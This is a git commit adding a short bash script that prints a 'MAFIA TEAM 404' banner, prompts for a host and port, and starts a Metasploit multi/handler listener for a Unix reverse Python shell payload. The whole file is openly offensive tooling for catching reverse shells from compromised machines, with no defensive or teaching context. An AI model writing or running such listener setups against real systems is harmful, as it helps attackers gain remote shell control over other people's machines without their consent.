68f79df3a6c68777c5177a597d2591348af949b2
JOBA-MAFIA-404 <78035390+JOBA-MAFIA-404@users.noreply.github.com>
2021-02-11 10:39:13 +0200

    Add files via upload

---
+++ bash3.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+figlet MAFIA TEAM 404
+
+read -p 'Put the IP or host to open a session ~~>' ip
+echo ' '
+read -p 'Put the port to open a session       ~~>' port
+
+msfconsole -q -x 'use exploit/multi/handler' -x 'set PAYLOAD cmd/unix/reverse_python' -x 'set LHOST '$ip -x 'set LPORT '$port -x 'exploit'
